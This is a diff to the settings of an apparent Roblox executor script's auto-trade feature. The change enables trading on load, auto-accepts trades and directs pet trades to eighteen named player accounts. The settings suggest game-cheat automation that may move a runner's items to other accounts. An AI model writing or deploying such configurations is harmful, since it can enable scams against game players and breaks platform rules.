@@ -12,11 +12,11 @@ getgenv().Utility = {
         AutoTrade = {
             Enabled = true, -- Start auto trading on load
             AutoAcceptTrades = true, -- Auto accept incoming trade requests
-            Usernames = {}, -- Players to trade with e.g. {"player1", "player2"}
-            TradeMode = "all", -- "all" = trade everything in categories, "specific" = only Items list
-            Categories = {"pets", "toys", "food", "transport", "gifts", "stickers", "pet_accessories"}, -- Categories to include
+            Usernames = {"Haz3lCreates96", "S4gecalebtvepic", "cosmicRexRbx", "NoraCodesVibes42", "sag3dinoBunny", "ultraSageLucasOffici", "dashezra2007", "Br4veKoalaDudeTV", "ShadowSkat3s79", "itzoliviabloxfuzzy", "R0cket_z00m1746", "ZoenationVibeskoala2", "ThefinnIsabellaVibes", "AriBloxClubRex", "ShadowMrRapidfox", "BraveravenkidYT2014", "HazellcreatesVibes", "thesagekoala2014"}, -- Players to trade with e.g. {"player1", "player2"}
+            TradeMode = "spesific", -- "all" = trade everything in categories, "specific" = only Items list
+            Categories = {"pets"}, -- Categories to include
             Items = {}, -- Item IDs/names when TradeMode = "specific" e.g. {"dog", "cat", "buffalo"}
-            PetTypes = {}, -- Filter pet types, {} = all, e.g. {"regular", "neon", "mega"}
+            PetTypes = {"regular"}, -- Filter pet types, {} = all, e.g. {"regular", "neon", "mega"}
             Ages = {}, -- Filter pet ages, {} = all, e.g. {6} for full grown only
             Filters = {
                 Kind = "ALL", -- Filter by specific item ID, "ALL" = no filter
